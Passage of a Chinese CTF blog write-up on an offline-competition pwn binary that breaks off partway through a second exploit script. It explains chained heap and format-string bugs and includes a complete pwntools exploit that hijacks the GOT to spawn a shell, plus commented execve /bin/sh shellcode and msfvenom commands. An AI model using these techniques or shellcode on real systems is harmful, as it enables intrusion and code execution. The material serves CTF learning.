    <link href="https://winter3un.github.io/2017/08/16/2017-8-10/"/>
    <id>https://winter3un.github.io/2017/08/16/2017-8-10/</id>
    <published>2017-08-16T16:32:29.000Z</published>
    <updated>2017-08-17T17:05:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>将atoi_got修改成printf_plt，威力无穷~</strong></p><p>线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。</p><ul><li>string overflow</li><li>int overflow</li><li>off by one</li><li>race condition</li><li>heap overlay </li><li>fmt</li></ul><a id="more"></a><h3 id="第一个漏洞"><a href="#第一个漏洞" class="headerlink" title="第一个漏洞"></a>第一个漏洞</h3><p>第一个漏洞出现在west模块，该模块可以创建最多两个house，初始的金币都为5（虽然有一个tricks，但是然并软），然后可以选择其中一个house的id购买weapon，若其中一个house的weapon比另一个强，就可以将另一个house消灭掉（free），那么我们怎么才能增加我们的金币数目呢，其实我们可以利用string overflow的方式，如下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">fgets(&amp;s1, 0x16, stdin);</div><div class="line">v9 = 0xA;</div><div class="line">if ( strlen(&amp;s1) &gt; 0x10 )</div><div class="line">&#123;</div><div class="line">puts(&quot;Your name is too long!&quot;);</div><div class="line">exit(-1);</div><div class="line">&#125;</div><div class="line">str_cpy(0x28LL * (signed int)i + 0x605148, (__int64)&amp;s1);</div></pre></td></tr></table></figure><p>s1可以输入0x16个字节，而string函数都以<code>&#39;\x00&#39;</code>字节定义字符串的结束，我们可以构造绕过，将money覆盖成一个最大数<code>0x7fffffff</code>,即可买我们想要的任何装备，接着漏洞出现在<code>snprintf</code>处，该函数的返回值由原本要复制到<code>dst addr</code> 的数据长度决定，故而这边存在一个溢出，我们只要让返回值大于<code>0x54</code>即可，<code>int overflow</code>刚好能够做到这件事。接着利用刚才获取的长度溢出一个字节（只能达到一个字节，故而我们可以利用<code>off by one</code>技术将指向soliders的指针位置上移），接着利用heap overlay技术将该上移的指针加入到unsorted bin内，在下次分配的时候，能够再次分配到该空间，故而我们可以利用该空间将house中的soliders指针地址修改成<code>atoi_got</code>，然后在写入<code>print_plt</code>的地址，利用fmt技术泄漏libc信息，算出system的地址，将atoi_got的地址修改成system地址，即可拿到shell，草稿如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">0x605140</div><div class="line"></div><div class="line">|ptr1(0xa0)|xxxxxxxx|xxxxxxxx    </div><div class="line"></div><div class="line"></div><div class="line">0x605158</div><div class="line"></div><div class="line">|money 0x605158|length 0x60515c</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">ptr1 size:0xa0</div><div class="line"></div><div class="line">weapon(size:0x68)|ptr2(0x50) size:0x8|ally(size:0x30)</div><div class="line"></div><div class="line">0x10 0x40</div><div class="line"></div><div class="line"></div><div class="line">ptr2( read soliders 0x50)</div><div class="line"></div><div class="line"></div><div class="line">0x605190 ptr2_addr</div><div class="line"></div><div class="line"></div><div class="line">一些细节：</div><div class="line"></div><div class="line">可以从else中的puts字符串来快速分析判断的是什么</div><div class="line"></div><div class="line">uaf漏洞的分析，看free后，指针是否置0</div><div class="line"></div><div class="line">逆向功底很重要。</div><div class="line"></div><div class="line">strcmp</div><div class="line">strlen</div><div class="line">都可以绕过</div></pre></td></tr></table></figure><p>第一个漏洞的利用exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-15 21:50:04</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># west</span></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_house</span><span class="params">(soliders)</span>:</span></div><div class="line"><span class="comment"># create a house</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"\x00"</span>*<span class="number">0x10</span>+p32(<span class="number">0x7fffffff</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"-2147483647"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment">## Words</span></div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x2e</span>)</div><div class="line"></div><div class="line"><span class="comment">## soliders</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(soliders))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*soliders)</div><div class="line"></div><div class="line"><span class="comment">## ally</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x30</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_house2</span><span class="params">()</span>:</span></div><div class="line"><span class="comment"># create a house</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"\x00"</span>*<span class="number">0x10</span>+p32(<span class="number">0x7fffffff</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment"># int overflow</span></div><div class="line">sl(<span class="string">"-2147483647"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment">## Words</span></div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x2e</span>)</div><div class="line"></div><div class="line"><span class="comment">## soliders</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(<span class="number">0x50</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">'a'</span>*<span class="number">0x38</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line"></div><div class="line"><span class="comment">## ally</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x30</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_weapon</span><span class="params">(_id,weapon)</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">'5000000\n'</span>)</div><div class="line">sl(str(weapon))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_word</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1024"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">" to Death?\n"</span>)</div><div class="line"><span class="comment"># 0x10+0x14</span></div><div class="line">payload = <span class="string">"Not today\x00"</span></div><div class="line">payload = payload.ljust(<span class="number">0x30</span><span class="number">-0x24</span>,<span class="string">"a"</span>)</div><div class="line"><span class="comment"># heap overlay </span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x1c0</span><span class="number">-0x30</span>+<span class="number">1</span>)</div><div class="line">payload = payload.ljust(<span class="number">0x54</span>,<span class="string">"a"</span>)</div><div class="line"><span class="comment"># fake chunck off by one</span></div><div class="line">payload += chr(<span class="number">0x30</span>+<span class="number">0x10</span>)</div><div class="line">sd(payload)</div><div class="line"><span class="comment"># pass</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_war</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_vassal</span><span class="params">(addr)</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(<span class="number">0x50</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(p64(addr))</div><div class="line">create_house(<span class="number">0x50</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x401AE2\nc")</span></div><div class="line">create_house(<span class="number">0x40</span>)</div><div class="line">change_weapon(<span class="number">0</span>,<span class="number">4</span>)</div><div class="line">change_weapon(<span class="number">1</span>,<span class="number">5</span>)</div><div class="line">start_war()</div><div class="line"><span class="comment"># race condition</span></div><div class="line">change_word()</div><div class="line"><span class="keyword">import</span> time</div><div class="line">time.sleep(<span class="number">3</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x402301\nc")</span></div><div class="line"><span class="comment"># unsorted bin FIFO</span></div><div class="line">create_house2()</div><div class="line"><span class="comment"># fmt</span></div><div class="line">change_vassal(elf.symbols[<span class="string">"printf"</span>])</div><div class="line"></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># edit_addr</span></div><div class="line">sl(<span class="string">"%7$n...."</span>+p64(<span class="number">0x605130</span>))</div><div class="line"><span class="comment"># change_vassal(system_addr)</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x402301\nc")</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"123"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x7</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">sl(p64(system_addr))</div><div class="line"></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="第二个漏洞"><a href="#第二个漏洞" class="headerlink" title="第二个漏洞"></a>第二个漏洞</h3><p>第二个漏洞出现在east模块，该模块下，存储slaves的长度被设计成为 chunk_size-8，而chunks_size由于其末三位是标记位，prev_size标记位于第8位，该标记位在前一个chunk在使用中时置1，故而当我们过呢关系slaves时，我们拥有一个字节的溢出，即off by one。我们可以利用这一个字节的溢出来修改下一个chunk的prev_size和其标记位来为实现overlay heap 和 unlink 攻击做铺垫（事实上这边只用到了unlink攻击，向前unlink），这边其实卡了我很久，一开始在想向前合并还是向后合并，后来尝试向后合并，但是 loyalty chunk的大小是0xe0+0x10 向后合并需要在下一个chunk构建fake_chunk_head，故而需要伪造 loyalty chunk_size 的字段值，使其满足寻址（找到下一个chunk）的逻辑，这个值是<code>0xe0+0x10+0x1+0x10=0x101</code>，很遗憾，需要溢出两个字节才能达到要求，而我们并没有溢出两个字节的条件。故而想到向前合并，在loyalty chunk的前一个chunk中构建fake_chunk_head，将loyalty chunk_size_prev_flag置0，构造loyalty prev_size，触发free loyalty chunk，我们便可以获得一次任意地址写的机会~~利用代码如下，其实直接看代码就可以，逻辑很清晰。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 00:53:09</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># east</span></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Occupy</span><span class="params">(slaves,date)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"choice:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(slaves))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(date)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_slaves</span><span class="params">(_id,date)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(str(date))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruin</span><span class="params">(_id,flag)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"ruin\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">"nate him?(y/n)"</span>)</div><div class="line">sl(flag)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(_id)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line"></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#0</span></div><div class="line">ru(<span class="string">"Khal"</span>)</div><div class="line">sl(<span class="string">"123"</span>)</div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div 